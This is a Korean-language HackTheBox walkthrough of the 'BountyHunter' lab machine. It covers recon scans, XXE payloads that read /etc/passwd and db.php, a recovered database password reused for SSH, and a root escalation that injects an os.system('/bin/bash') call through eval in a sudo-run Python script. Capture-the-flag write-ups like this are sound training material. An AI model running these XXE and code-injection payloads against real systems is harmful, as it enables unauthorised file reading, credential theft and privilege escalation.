# BountyHunter - HackTheBox
- [Recon](#recon)
- [HTTP](#http)
- [Privesc](#privesc)

---
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA bountyhunter 10.129.7.180
```
<img width="1204" height="510" alt="image" src="https://github.com/user-attachments/assets/b8349a68-830a-4a9f-aebf-fc58b5ffadc0" />

- SSH
- HTTP

---
## HTTP
### banner grabbing
<img width="1204" height="292" alt="image" src="https://github.com/user-attachments/assets/b91e2080-c891-4a65-b42b-ad5133cf101b" />

### directory
- `db.php` 발견.
```bash
feroxbuster -u http://10.129.7.180 -x php,md,txt,js -C 404,405 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
<img width="1204" height="557" alt="image" src="https://github.com/user-attachments/assets/db6a3fb2-f190-4e3b-bdfd-4520d9d8229c" />

### XXE
- 메인페이지에서 `Portal` 탭을 통해서 `/log_submit.php`경로로 이동.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/109ec355-b269-48c8-bacd-99b053230f61" />

<br>
<br>

- form을 채워서 제출한 후 burpsuite로 가로채서 확인.
- data부분이 `base64`로 인코딩된 후 `url`인코딩이 된 것 처럼 보임.
<img width="1548" height="820" alt="image" src="https://github.com/user-attachments/assets/92f96002-4e4b-4649-bacf-1003664edc68" />

<br>
<br>

- burpsuite로 `url` 디코딩.
<img width="1711" height="200" alt="image" src="https://github.com/user-attachments/assets/0b25abc3-a966-4c1b-bbcb-1c74c34dddac" />

<br>
<br>

- `base64` 디코딩.
- `xml`로 데이터 전달하는 것을 확인.
<img width="1203" height="248" alt="image" src="https://github.com/user-attachments/assets/e4c3ae93-bff8-4115-b7a3-b2d7fd0ac3d7" />

<br>
<br>

- `/etc/passwd`를 읽을 수 있는지 xml를 수정하여 인코딩.
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                <bugreport>
                <title>&xxe;</title>
                <cwe></cwe>
                <cvss></cvss>
                <reward></reward>
                </bugreport>
```
```bash
cat ex.xml|base64 -w0|jq -srR '@uri'
```
<img width="1203" height="415" alt="image" src="https://github.com/user-attachments/assets/040d39c9-5d7b-4173-8ae0-fe61b20a8765" />

<br>
<br>

- data에 인코딩한 문자열을 넣어 요청하니 `/etc/passwd`를 읽을 수 있게 됨.
- `root`,`development` 유저 발견.
<img width="1547" height="817" alt="image" src="https://github.com/user-attachments/assets/389fddd8-85e0-4e0e-8d5c-107df5cd8e5d" />

<br>
<br>

- 경로탐색에서 발견한 `db.php`를 읽는 xml 생성.
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
                <bugreport>
                <title>&xxe;</title>
                <cwe></cwe>
                <cvss></cvss>
                <reward></reward>
                </bugreport>
```
```bash
cat ex.xml|base64 -w0|jq -srR '@uri'
```
<img width="1204" height="420" alt="image" src="https://github.com/user-attachments/assets/97911bbe-f97d-45e1-8eb1-5bcec44e906d" />

<br>
<br>

- burpsuite로 요청하여 `base64` 로 인코딩된  `db.php`획득.
<img width="1543" height="431" alt="image" src="https://github.com/user-attachments/assets/c38bd0b4-4d60-4937-b81f-959e40176fed" />

<br>
<br>

- 디코딩 하여 `db` 계정 획득.
```bash
echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo='|base64 -d
```
<img width="1204" height="297" alt="image" src="https://github.com/user-attachments/assets/af3ab3ef-4821-4709-b162-6d5af024a5d6" />

<br>
<br>

- `development:m19RoAU0hP41A1sTsq6K`로 SSH 로그인 시도하여 성공.
```bash
ssh development@10.129.7.180
```
<img width="1204" height="51" alt="image" src="https://github.com/user-attachments/assets/32b9b0f9-a9b3-4f07-a5c6-9670a743924f" />

---
## Privesc
- `ticketValidator.py`를 root 권한으로 실행 가능.
<img width="1204" height="145" alt="image" src="https://github.com/user-attachments/assets/faaaafcf-ae75-488d-99cc-3c931f952856" />

<br>
<br>

- `md`로 끝나는 확장자의 파일을 입력받음.
<img width="1204" height="154" alt="image" src="https://github.com/user-attachments/assets/5bf42e68-2b3c-4232-837c-310f182f7ec8" />
<img width="1204" height="295" alt="image" src="https://github.com/user-attachments/assets/425e7cfd-3ab8-4d9e-890c-dd7749795d72" />

<br>
<br>

- 각각의 줄마다 시작하는 문자열을 확인한 후 `eval`를 실행하여 숫자를 연산한 후 값 반환.
<img width="1204" height="627" alt="image" src="https://github.com/user-attachments/assets/6f05f5f1-8452-4dfb-91a4-43a26d50afe4" />

<br>
<br>

- `eval`에서 튜플로 전달할 경우 여러 명령어가 실행이 가능해짐.
<img width="1204" height="150" alt="image" src="https://github.com/user-attachments/assets/8fbc20f8-1168-4bf9-8fa2-1c6a435593f3" />

<br>
<br>

- `ex.md`를 생성하여 실행이 되는지 확인.
```bash
# Skytrain Inc
## Ticket to test
__Ticket Code:__
**11+321+1**
```
<img width="1204" height="121" alt="image" src="https://github.com/user-attachments/assets/8b6cf211-e7ac-4b24-b7f2-d57e8f822efd" />

<br>
<br>

- `/bin/bash`를 연속하여 실행시키는 코드를 생성하여 실행.
- 셸 획득.
```bash
# Skytrain Inc
## Ticket to test
__Ticket Code:__
**11+321+1,__import__('os').system('/bin/bash')**
```
<img width="1204" height="145" alt="image" src="https://github.com/user-attachments/assets/f8d37d73-7a0e-4399-9191-16b414c43380" />

---
## FLAG
- `/home/development/user.txt`
<img width="1204" height="364" alt="image" src="https://github.com/user-attachments/assets/cdb99404-564f-4f61-8217-b54effb8a7a2" />

<br>
<br>

- `/root/root.txt`
<img width="1204" height="319" alt="image" src="https://github.com/user-attachments/assets/8538db01-1ff9-45fe-838e-f44b9948924a" />
